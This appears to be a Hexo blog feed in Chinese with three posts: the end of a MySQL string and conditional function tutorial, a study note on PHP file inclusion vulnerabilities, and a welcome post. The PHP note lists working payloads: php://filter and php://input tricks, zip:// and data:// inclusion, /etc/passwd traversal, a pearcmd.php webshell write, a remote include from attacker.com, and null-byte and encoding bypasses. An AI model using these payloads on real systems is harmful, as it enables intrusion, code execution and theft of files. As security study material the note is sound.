编码对照表</h3><table><thead><tr><th>十进制</th><th>十六进制</th><th>字符</th><th></th><th>十进制</th><th>十六进制</th><th>字符</th></tr></thead><tbody><tr><td>48</td><td>30</td><td>0</td><td></td><td>65</td><td>41</td><td>A</td></tr><tr><td>49</td><td>31</td><td>1</td><td></td><td>66</td><td>42</td><td>B</td></tr><tr><td>50</td><td>32</td><td>2</td><td></td><td>67</td><td>43</td><td>C</td></tr><tr><td>51</td><td>33</td><td>3</td><td></td><td>68</td><td>44</td><td>D</td></tr><tr><td>52</td><td>34</td><td>4</td><td></td><td>69</td><td>45</td><td>E</td></tr><tr><td>53</td><td>35</td><td>5</td><td></td><td>70</td><td>46</td><td>F</td></tr><tr><td>54</td><td>36</td><td>6</td><td></td><td>71</td><td>47</td><td>G</td></tr><tr><td>55</td><td>37</td><td>7</td><td></td><td>72</td><td>48</td><td>H</td></tr><tr><td>56</td><td>38</td><td>8</td><td></td><td>73</td><td>49</td><td>I</td></tr><tr><td>57</td><td>39</td><td>9</td><td></td><td>74</td><td>4A</td><td>J</td></tr><tr><td>…</td><td>…</td><td>…</td><td></td><td>…</td><td>…</td><td>…</td></tr><tr><td>97</td><td>61</td><td>a</td><td></td><td>122</td><td>7A</td><td>z</td></tr></tbody></table><p><strong>常用字符编码速查</strong>：</p><ul><li>数字 0-9：48-57</li><li>大写字母 A-Z：65-90</li><li>小写字母 a-z：97-122</li></ul><hr><h2 id="四、字符串长度函数：字节长度-vs-字符长度"><a href="#四、字符串长度函数：字节长度-vs-字符长度" class="headerlink" title="四、字符串长度函数：字节长度 vs 字符长度"></a>四、字符串长度函数：字节长度 vs 字符长度</h2><h3 id="4-1-LENGTH-返回字节长度"><a href="#4-1-LENGTH-返回字节长度" class="headerlink" title="4.1 LENGTH() - 返回字节长度"></a>4.1 <code>LENGTH()</code> - 返回字节长度</h3><p><strong>作用</strong>：返回字符串占用的<strong>字节数</strong>（bytes）</p><p><strong>语法</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LENGTH(字符串)</span><br></pre></td></tr></table></figure><p><strong>重要说明</strong>：</p><ul><li>⚠️ 这是<strong>字节长度</strong>，不是字符个数！</li><li>在 UTF-8 编码下：<ul><li>英文字符：1 字节&#x2F;字符</li><li>中文字符：通常 3 字节&#x2F;字符</li><li>Emoji 表情：通常 4 字节&#x2F;字符</li></ul></li><li>所以 <code>LENGTH()</code> 的结果可能大于实际字符数</li></ul><p><strong>示例</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> LENGTH(<span class="string">&#x27;abc&#x27;</span>);        <span class="comment">-- 结果：3（3个英文字符 = 3字节）</span></span><br><span class="line"><span class="keyword">SELECT</span> LENGTH(<span class="string">&#x27;&#x27;</span>);            <span class="comment">-- 结果：0</span></span><br><span class="line"><span class="keyword">SELECT</span> LENGTH(<span class="keyword">NULL</span>);          <span class="comment">-- 结果：NULL</span></span><br></pre></td></tr></table></figure><h3 id="4-2-CHAR-LENGTH-CHARACTER-LENGTH-返回字符个数"><a href="#4-2-CHAR-LENGTH-CHARACTER-LENGTH-返回字符个数" class="headerlink" title="4.2 CHAR_LENGTH() &#x2F; CHARACTER_LENGTH() - 返回字符个数"></a>4.2 <code>CHAR_LENGTH()</code> &#x2F; <code>CHARACTER_LENGTH()</code> - 返回字符个数</h3><p><strong>作用</strong>：返回字符串的<strong>字符个数</strong>（characters），更符合”有多少个字”的直观理解</p><p><strong>语法</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CHAR_LENGTH</span>(字符串)</span><br><span class="line"><span class="keyword">CHARACTER_LENGTH</span>(字符串)  <span class="comment">-- 与 CHAR_LENGTH() 完全等价</span></span><br></pre></td></tr></table></figure><p><strong>示例</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CHAR_LENGTH</span>(<span class="string">&#x27;abc&#x27;</span>);       <span class="comment">-- 结果：3（3个字符）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CHARACTER_LENGTH</span>(<span class="string">&#x27;abc&#x27;</span>);  <span class="comment">-- 结果：3（同上）</span></span><br></pre></td></tr></table></figure><h3 id="4-3-长度函数的区别对比"><a href="#4-3-长度函数的区别对比" class="headerlink" title="4.3 长度函数的区别对比"></a>4.3 长度函数的区别对比</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 英文：字节数 = 字符数</span></span><br><span class="line"><span class="keyword">SELECT</span> LENGTH(<span class="string">&#x27;hello&#x27;</span>);        <span class="comment">-- 5（字节）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CHAR_LENGTH</span>(<span class="string">&#x27;hello&#x27;</span>);   <span class="comment">-- 5（字符）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 中文：字节数 &gt; 字符数</span></span><br><span class="line"><span class="keyword">SELECT</span> LENGTH(<span class="string">&#x27;你好&#x27;</span>);         <span class="comment">-- 6（字节，每个汉字3字节）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CHAR_LENGTH</span>(<span class="string">&#x27;你好&#x27;</span>);    <span class="comment">-- 2（字符，2个汉字）</span></span><br></pre></td></tr></table></figure><h3 id="4-4-常见组合用法"><a href="#4-4-常见组合用法" class="headerlink" title="4.4 常见组合用法"></a>4.4 常见组合用法</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 获取当前账号/数据库名/版本号的长度（建议用 CHAR_LENGTH）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CHAR_LENGTH</span>(<span class="keyword">USER</span>());</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CHAR_LENGTH</span>(DATABASE());</span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CHAR_LENGTH</span>(VERSION());</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 配合截取：取第 n 位字符（从 1 开始计数）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(<span class="keyword">USER</span>(), <span class="number">1</span>, <span class="number">1</span>);      <span class="comment">-- 第1个字符</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">SUBSTRING</span>(DATABASE(), <span class="number">2</span>, <span class="number">1</span>);  <span class="comment">-- 第2个字符</span></span><br></pre></td></tr></table></figure><hr><h2 id="五、条件判断函数：让-SQL-更智能"><a href="#五、条件判断函数：让-SQL-更智能" class="headerlink" title="五、条件判断函数：让 SQL 更智能"></a>五、条件判断函数：让 SQL 更智能</h2><h3 id="5-1-IF-三元条件判断"><a href="#5-1-IF-三元条件判断" class="headerlink" title="5.1 IF() - 三元条件判断"></a>5.1 <code>IF()</code> - 三元条件判断</h3><p><strong>作用</strong>：根据条件返回不同的值（类似编程语言的三元表达式）</p><p><strong>语法</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IF(条件, 条件为真时的值, 条件为假时的值)</span><br></pre></td></tr></table></figure><p><strong>规则</strong>：</p><ul><li>条件为 TRUE（非0且非NULL）→ 返回第二个参数</li><li>条件为 FALSE（0 或 NULL）→ 返回第三个参数</li></ul><p><strong>示例</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 基本用法</span></span><br><span class="line"><span class="keyword">SELECT</span> IF(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>, <span class="string">&#x27;yes&#x27;</span>, <span class="string">&#x27;no&#x27;</span>);          <span class="comment">-- 结果：yes</span></span><br><span class="line"><span class="keyword">SELECT</span> IF(<span class="number">1</span><span class="operator">=</span><span class="number">2</span>, <span class="string">&#x27;yes&#x27;</span>, <span class="string">&#x27;no&#x27;</span>);          <span class="comment">-- 结果：no</span></span><br><span class="line"><span class="keyword">SELECT</span> IF(<span class="keyword">NULL</span>, <span class="string">&#x27;yes&#x27;</span>, <span class="string">&#x27;no&#x27;</span>);         <span class="comment">-- 结果：no</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 数值比较</span></span><br><span class="line"><span class="keyword">SELECT</span> IF(<span class="number">5</span><span class="operator">&gt;</span><span class="number">3</span>, <span class="number">100</span>, <span class="number">200</span>);             <span class="comment">-- 结果：100</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 配合字符串函数：判断账号第1位是否为 &#x27;r&#x27;</span></span><br><span class="line"><span class="keyword">SELECT</span> IF(<span class="built_in">SUBSTRING</span>(<span class="keyword">USER</span>(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;r&#x27;</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 配合 ASCII：判断第1位字符编码是否大于 100</span></span><br><span class="line"><span class="keyword">SELECT</span> IF(ASCII(<span class="built_in">SUBSTRING</span>(<span class="keyword">USER</span>(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><h3 id="5-2-IFNULL-处理-NULL-值"><a href="#5-2-IFNULL-处理-NULL-值" class="headerlink" title="5.2 IFNULL() - 处理 NULL 值"></a>5.2 <code>IFNULL()</code> - 处理 NULL 值</h3><p><strong>作用</strong>：如果第一个值为 NULL，则返回第二个值（默认值），否则返回第一个值</p><p><strong>语法</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IFNULL(值<span class="number">1</span>, 默认值)</span><br></pre></td></tr></table></figure><p><strong>使用场景</strong>：避免 NULL 值导致的问题，提供默认值</p><p><strong>示例</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> IFNULL(<span class="keyword">NULL</span>, <span class="string">&#x27;fallback&#x27;</span>);      <span class="comment">-- 结果：fallback</span></span><br><span class="line"><span class="keyword">SELECT</span> IFNULL(<span class="string">&#x27;abc&#x27;</span>, <span class="string">&#x27;fallback&#x27;</span>);     <span class="comment">-- 结果：abc</span></span><br><span class="line"><span class="keyword">SELECT</span> IFNULL(DATABASE(), <span class="string">&#x27;no_db&#x27;</span>);   <span class="comment">-- 未选择数据库时返回 &#x27;no_db&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="5-3-NULLIF-相等时返回-NULL"><a href="#5-3-NULLIF-相等时返回-NULL" class="headerlink" title="5.3 NULLIF() - 相等时返回 NULL"></a>5.3 <code>NULLIF()</code> - 相等时返回 NULL</h3><p><strong>作用</strong>：如果两个值相等，返回 NULL；否则返回第一个值</p><p><strong>语法</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">NULLIF</span>(值<span class="number">1</span>, 值<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p><strong>使用场景</strong>：将特定值转换为 NULL（常用于数据清洗）</p><p><strong>示例</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">NULLIF</span>(<span class="number">5</span>, <span class="number">5</span>);                  <span class="comment">-- 结果：NULL（相等）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">NULLIF</span>(<span class="number">5</span>, <span class="number">3</span>);                  <span class="comment">-- 结果：5（不相等）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">NULLIF</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>);              <span class="comment">-- 结果：&#x27;a&#x27;（不相等）</span></span><br></pre></td></tr></table></figure><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文介绍了 MySQL 中最常用的 SQL 函数：</p><ol><li><strong>环境信息函数</strong>：<code>USER()</code>, <code>DATABASE()</code>, <code>VERSION()</code> - 快速了解当前连接信息</li><li><strong>字符串截取</strong>：<code>SUBSTRING()</code>, <code>LEFT()</code>, <code>RIGHT()</code> - 灵活提取字符串片段</li><li><strong>字符编码</strong>：<code>ASCII()</code>, <code>CHAR()</code> - 字符与数字编码的相互转换</li><li><strong>长度计算</strong>：<code>LENGTH()</code>, <code>CHAR_LENGTH()</code> - 字节长度 vs 字符长度</li><li><strong>条件判断</strong>：<code>IF()</code>, <code>IFNULL()</code>, <code>NULLIF()</code> - 让 SQL 逻辑更灵活</li></ol><p>掌握这些函数，可以让你在 SQL 查询中更加得心应手！</p><hr><p><strong>提示</strong>：在实际使用中，这些函数经常组合使用，比如 <code>ASCII(SUBSTRING(USER(), 1, 1))</code> 可以获取账号首字符的编码值。多练习组合使用，能解决很多实际问题！</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> MySQL </tag>
            
            <tag> 数据库 </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP文件包含漏洞-学习笔记</title>
      <link href="/2026/01/18/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2026/01/18/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>核心结论：PHP文件包含漏洞的本质是「文件包含函数未对用户可控文件名做严格校验」，导致攻击者可通过构造路径&#x2F;伪协议，触发文件读取、代码执行等风险，其触发与底层文件解析逻辑、PHP配置、系统特性强相关。</p><h2 id="一、漏洞基础（源码视角）"><a href="#一、漏洞基础（源码视角）" class="headerlink" title="一、漏洞基础（源码视角）"></a>一、漏洞基础（源码视角）</h2><h3 id="1-核心定义"><a href="#1-核心定义" class="headerlink" title="1. 核心定义"></a>1. 核心定义</h3><p>当PHP代码中使用 <code>include</code>&#x2F;<code>require</code> 等函数，且传入的文件名由用户控制（如 <code>$_GET[&#39;file&#39;]</code>），未经过滤直接拼接路径执行时，攻击者可构造恶意路径，实现「非预期文件包含」，进而泄露源码或执行恶意代码。</p><h3 id="2-关键依赖（php-ini配置）"><a href="#2-关键依赖（php-ini配置）" class="headerlink" title="2. 关键依赖（php.ini配置）"></a>2. 关键依赖（php.ini配置）</h3><p>配置项直接决定漏洞利用范围，源码层面会通过全局变量判断是否允许对应操作：</p><ul><li><code>allow_url_fopen=On</code>（默认开启）：允许从远程服务器读取数据（影响远程文件包含）。</li><li><code>allow_url_include=On</code>（PHP5.2后默认关闭）：允许 <code>include/require</code> 远程文件（远程包含漏洞的核心开关）。</li><li><code>open_basedir</code>：限制PHP可访问的目录树，源码层面会校验文件路径是否在允许范围内，是重要防御配置。</li></ul><h3 id="3-核心函数（源码差异）"><a href="#3-核心函数（源码差异）" class="headerlink" title="3. 核心函数（源码差异）"></a>3. 核心函数（源码差异）</h3><p>PHP文件包含函数的底层实现逻辑决定了其错误处理和重复包含特性：</p><table><thead><tr><th>函数</th><th>源码层面核心差异</th></tr></thead><tbody><tr><td><code>include()</code></td><td>加载失败仅抛出 <code>E_WARNING</code>，脚本继续执行；底层调用 <code>php_stream_open_wrapper</code> 解析路径</td></tr><tr><td><code>require()</code></td><td>加载失败抛出 <code>E_COMPILE_ERROR</code>，脚本终止；解析逻辑与 <code>include</code> 一致</td></tr><tr><td><code>include_once()</code></td><td>先通过 <code>zend_hash</code> 检查文件是否已包含，已包含则跳过；依赖路径解析结果去重</td></tr><tr><td><code>require_once()</code></td><td>错误处理同 <code>require</code>，去重逻辑同 <code>include_once</code></td></tr></tbody></table><h2 id="二、漏洞触发的底层逻辑（源码拆解）"><a href="#二、漏洞触发的底层逻辑（源码拆解）" class="headerlink" title="二、漏洞触发的底层逻辑（源码拆解）"></a>二、漏洞触发的底层逻辑（源码拆解）</h2><p>以最简化漏洞代码为例，分析触发流程：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="1-路径解析流程（源码核心步骤）"><a href="#1-路径解析流程（源码核心步骤）" class="headerlink" title="1. 路径解析流程（源码核心步骤）"></a>1. 路径解析流程（源码核心步骤）</h3><ol><li>接收用户输入 <code>$_GET[&#39;file&#39;]</code>，未做任何过滤；</li><li>调用底层 <code>php_stream_open_wrapper_ex</code> 函数，解析传入的路径（处理 <code>../</code>、软链接、伪协议等）；</li><li>若路径合法（存在对应文件），读取文件内容并当作PHP代码执行；</li><li>若路径非法（文件不存在），根据函数类型抛出对应错误。</li></ol><h3 id="2-漏洞触发的核心原因"><a href="#2-漏洞触发的核心原因" class="headerlink" title="2. 漏洞触发的核心原因"></a>2. 漏洞触发的核心原因</h3><ul><li>源码未对用户输入做「白名单校验」：未限制仅允许包含指定目录&#x2F;文件；</li><li>未过滤「路径穿越字符」：<code>../</code>、<code>./</code> 等符号未被替换，导致攻击者可跳转至任意目录；</li><li>未拦截「危险伪协议」：<code>php://</code>、<code>zip://</code> 等协议未被禁止，攻击者可构造特殊流触发代码执行。</li></ul><h2 id="三、核心利用方式（源码-实例）"><a href="#三、核心利用方式（源码-实例）" class="headerlink" title="三、核心利用方式（源码+实例）"></a>三、核心利用方式（源码+实例）</h2><h3 id="1-伪协议利用（最常用）"><a href="#1-伪协议利用（最常用）" class="headerlink" title="1. 伪协议利用（最常用）"></a>1. 伪协议利用（最常用）</h3><p>伪协议是PHP内置的IO流，底层通过 <code>php_stream_wrapper</code> 系列函数实现解析，攻击者可利用其特性绕过限制：</p><h4 id="（1）php-filter（源码读取）"><a href="#（1）php-filter（源码读取）" class="headerlink" title="（1）php:&#x2F;&#x2F;filter（源码读取）"></a>（1）php:&#x2F;&#x2F;filter（源码读取）</h4><ul><li>核心逻辑：通过「过滤流」对目标文件进行编码（如base64），避免文件内容直接当作PHP代码执行，进而泄露源码；</li><li>源码层面：<code>convert.base64-encode</code> 过滤器会遍历文件内容，按base64规则编码后输出，不触发代码执行；</li><li>实例：<code>?file=php://filter/read=convert.base64-encode/resource=config.php</code>，解码后获取配置文件源码。</li></ul><h4 id="（2）php-input（代码执行）"><a href="#（2）php-input（代码执行）" class="headerlink" title="（2）php:&#x2F;&#x2F;input（代码执行）"></a>（2）php:&#x2F;&#x2F;input（代码执行）</h4><ul><li>核心逻辑：读取HTTP请求的原始POST数据，若 <code>allow_url_include=On</code>，可将POST数据当作PHP代码执行；</li><li>源码层面：<code>php://input</code> 对应 <code>php_stream_input</code> 流，直接返回POST原始数据，无额外过滤；</li><li>实例：<code>?file=php://input</code>，POST数据传入 <code>&lt;?php system(&#39;id&#39;); ?&gt;</code>，触发命令执行。</li></ul><h4 id="（3）zip-phar-（压缩包包含）"><a href="#（3）zip-phar-（压缩包包含）" class="headerlink" title="（3）zip:&#x2F;&#x2F;&#x2F;phar:&#x2F;&#x2F;（压缩包包含）"></a>（3）zip:&#x2F;&#x2F;&#x2F;phar:&#x2F;&#x2F;（压缩包包含）</h4><ul><li>核心逻辑：底层支持解析压缩包内文件，攻击者可将恶意PHP文件压缩后，通过协议直接包含压缩包内的恶意代码；</li><li>源码层面：<code>zip://</code> 调用 <code>php_stream_zip_open</code> 函数，解析压缩包路径（<code>#</code> 分隔压缩包与内部文件，需URL编码为 <code>%23</code>）；</li><li>实例：<code>?file=zip:///var/www/upload/1.jpg%23shell.php</code>（1.jpg是包含shell.php的压缩包，后缀可伪装）。</li></ul><h4 id="（4）data-（直接执行代码）"><a href="#（4）data-（直接执行代码）" class="headerlink" title="（4）data:&#x2F;&#x2F;（直接执行代码）"></a>（4）data:&#x2F;&#x2F;（直接执行代码）</h4><ul><li>核心逻辑：将数据当作文件内容解析，需 <code>allow_url_fopen</code> 和 <code>allow_url_include</code> 均开启；</li><li>源码层面：<code>data://</code> 流直接读取传入的字符串，按指定编码（如base64）解码后执行；</li><li>实例：<code>?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</code>（base64解码后为 <code>&lt;?php phpinfo(); ?&gt;</code>）。</li></ul><h3 id="2-路径穿越利用（目录跳转）"><a href="#2-路径穿越利用（目录跳转）" class="headerlink" title="2. 路径穿越利用（目录跳转）"></a>2. 路径穿越利用（目录跳转）</h3><ul><li>核心逻辑：利用 <code>../</code>（上级目录）、<code>./</code>（当前目录）字符，绕过源码中「固定路径前缀」的限制；</li><li>源码层面：PHP会调用系统 <code>realpath</code> 函数解析路径，若未过滤 <code>../</code>，则会跳转至任意目录；</li><li>实例：漏洞代码 <code>include &quot;/var/www/html/&quot;.$_GET[&#39;file&#39;];</code>，攻击者构造 <code>?file=../../etc/passwd</code>，最终解析为 <code>/var/www/html/../../etc/passwd</code>，即 <code>/etc/passwd</code>，泄露系统文件。</li></ul><h3 id="3-临时文件包含（竞争条件）"><a href="#3-临时文件包含（竞争条件）" class="headerlink" title="3. 临时文件包含（竞争条件）"></a>3. 临时文件包含（竞争条件）</h3><ul><li>核心逻辑：PHP上传文件&#x2F;处理大请求时，会生成临时文件（如 <code>/tmp/phpXXXXXX</code>），底层会在请求结束后自动删除，攻击者可通过「条件竞争」在删除前包含该文件；</li><li>源码层面：临时文件由 <code>php_stream_fopen_tmpfile</code> 函数创建，文件名由随机字符生成，需通过phpinfo泄露路径或暴力猜解；</li><li>典型场景：<ul><li>上传文件时，临时文件在 <code>/tmp</code> 目录存在短暂窗口期；</li><li><code>session.upload_progress</code> 特性（默认开启）：上传时会将进度信息写入Session文件，可通过条件竞争包含。</li></ul></li></ul><h3 id="4-特殊场景利用（结合系统-PHP特性）"><a href="#4-特殊场景利用（结合系统-PHP特性）" class="headerlink" title="4. 特殊场景利用（结合系统&#x2F;PHP特性）"></a>4. 特殊场景利用（结合系统&#x2F;PHP特性）</h3><h4 id="（1）绕过-include-once-限制（多级软链接）"><a href="#（1）绕过-include-once-限制（多级软链接）" class="headerlink" title="（1）绕过 include_once 限制（多级软链接）"></a>（1）绕过 <code>include_once</code> 限制（多级软链接）</h4><ul><li>源码层面：<code>include_once</code> 依赖「路径去重」，PHP会通过 <code>lstat</code> 函数解析路径，将软链接转换为真实路径；</li><li>利用逻辑：当软链接跳转次数超过Linux <code>lstat</code> 函数的递归上限（默认约20次），解析会失败，导致真实路径与记录路径不一致，从而绕过去重；</li><li>实例：<code>?file=/proc/self/root/proc/self/root/.../www/config.php</code>（重复20+次 <code>/proc/self/root</code>，最终解析路径与原始路径不同）。</li></ul><h4 id="（2）Windows通配符利用"><a href="#（2）Windows通配符利用" class="headerlink" title="（2）Windows通配符利用"></a>（2）Windows通配符利用</h4><ul><li>核心逻辑：PHP在Windows下调用 <code>FindFirstFileExW</code> API解析文件，该API支持特殊通配符（<code>&lt;?</code> 匹配0+字符、<code>&gt;</code> 匹配1字符）；</li><li>源码层面：未过滤通配符，攻击者可通过 <code>C:\Windows\Temp\php&lt;&lt;</code> 匹配临时文件名（<code>php</code> 后接随机字符）；</li><li>实例：上传文件后，构造 <code>?file=C:\Windows\Temp\php&lt;&lt;</code>，包含临时文件中的恶意代码。</li></ul><h4 id="（3）Docker环境（pearcmd-php利用）"><a href="#（3）Docker环境（pearcmd-php利用）" class="headerlink" title="（3）Docker环境（pearcmd.php利用）"></a>（3）Docker环境（pearcmd.php利用）</h4><ul><li>源码层面：Docker默认安装PEAR，<code>pearcmd.php</code> 路径固定（<code>/usr/local/lib/php/pearcmd.php</code>），且开启 <code>register_argc_argv</code> 时，可通过query-string控制命令行参数；</li><li>利用逻辑：<code>pearcmd.php</code> 的 <code>config-create</code> 命令支持写入文件，攻击者通过包含该文件，构造参数写入恶意代码；</li><li>实例：<code>?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?php system(&#39;id&#39;);?&gt;+/tmp/shell.php</code>。</li></ul><h2 id="四、常见绕过技巧（源码-底层逻辑）"><a href="#四、常见绕过技巧（源码-底层逻辑）" class="headerlink" title="四、常见绕过技巧（源码&#x2F;底层逻辑）"></a>四、常见绕过技巧（源码&#x2F;底层逻辑）</h2><h3 id="1-路径过滤绕过"><a href="#1-路径过滤绕过" class="headerlink" title="1. 路径过滤绕过"></a>1. 路径过滤绕过</h3><ul><li>编码绕过：<code>../</code> 编码为 <code>%2e%2e%2f</code>（URL编码）、<code>%252e%252e%252f</code>（二次编码），源码层面解码后还原；</li><li>容器特性：Apache Tomcat支持 <code>..%c0%af</code> 解析为 <code>../</code>，底层编码解析逻辑差异导致；</li><li>长度截断：PHP&lt;5.2.8时，Windows路径最大256字节、Linux最大4096字节，重复 <code>./</code> 超出长度后，后缀会被丢弃（如 <code>?file=shell.php./././...</code>）。</li></ul><h3 id="2-后缀限制绕过"><a href="#2-后缀限制绕过" class="headerlink" title="2. 后缀限制绕过"></a>2. 后缀限制绕过</h3><ul><li><code>%00</code> 截断：PHP&lt;5.3.4且 <code>magic_quotes_gpc=Off</code> 时，源码层面遇到 <code>%00</code>（null字节）会停止解析，如 <code>?file=shell.php%00.txt</code> 截断后缀 <code>.txt</code>；</li><li>协议绕过：利用 <code>zip://</code>&#x2F;<code>phar://</code>，后缀拼接不影响协议解析（如 <code>?file=zip://test.jpg%23shell.php.txt</code>）；</li><li>URL片段：<code>?file=http://attacker.com/shell.php%23.txt</code>，<code>#</code> 后内容为URL片段，源码层面解析时忽略。</li></ul><h3 id="3-伪协议拦截绕过"><a href="#3-伪协议拦截绕过" class="headerlink" title="3. 伪协议拦截绕过"></a>3. 伪协议拦截绕过</h3><ul><li>大小写混淆：<code>PhP://FiLtEr</code>，源码层面协议解析不区分大小写；</li><li>协议变种：<code>php://filter/|convert.base64-decode/resource=config.php</code>，通过过滤器组合绕过简单字符串拦截。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Web安全 </tag>
            
            <tag> 安全 </tag>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>欢迎来到我的博客</title>
      <link href="/2026/01/17/hello-blog/"/>
      <url>/2026/01/17/hello-blog/</url>
      
        <content type="html"><![CDATA[<h2 id="你好，世界！"><a href="#你好，世界！" class="headerlink" title="你好，世界！"></a>你好，世界！</h2><p>欢迎来到我的个人博客 Wblog。这是我的第一篇文章。</p><h3 id="关于这个博客"><a href="#关于这个博客" class="headerlink" title="关于这个博客"></a>关于这个博客</h3><p>这个博客使用 Hexo 搭建，托管在 GitHub Pages 上。我会在这里分享：</p><ul><li>技术学习笔记</li><li>生活感悟</li><li>读书心得</li><li>项目经验</li></ul><h3 id="终身学习"><a href="#终身学习" class="headerlink" title="终身学习"></a>终身学习</h3><p>正如博客的描述所说，我相信终身学习的力量。在这个快速变化的时代，保持学习的热情和好奇心是最重要的。</p><p>希望通过这个博客，记录自己的成长轨迹，也能与大家交流分享。</p><span id="more"></span><h3 id="未来计划"><a href="#未来计划" class="headerlink" title="未来计划"></a>未来计划</h3><p>接下来我会持续更新博客内容，主要方向包括：</p><ol><li><strong>技术文章</strong> - 编程语言、框架、工具使用心得</li><li><strong>项目实践</strong> - 实际项目中遇到的问题和解决方案</li><li><strong>学习笔记</strong> - 读书笔记、课程总结</li><li><strong>思考感悟</strong> - 对技术、生活的思考</li></ol><h3 id="联系方式"><a href="#联系方式" class="headerlink" title="联系方式"></a>联系方式</h3><p>如果你对我的文章有任何想法或建议，欢迎通过以下方式联系我：</p><ul><li>GitHub: <a href="https://github.com/xionglinxin">linxin</a></li><li>Email: <a href="mailto:&#50;&#52;&#50;&#53;&#55;&#51;&#x35;&#56;&#x35;&#50;&#x40;&#113;&#113;&#x2e;&#x63;&#111;&#x6d;">&#50;&#52;&#50;&#53;&#55;&#51;&#x35;&#56;&#x35;&#50;&#x40;&#113;&#113;&#x2e;&#x63;&#111;&#x6d;</a></li></ul><p>让我们一起在学习的道路上前行！</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
            <tag> 开始 </tag>
            
        </tags>
      
    </entry>
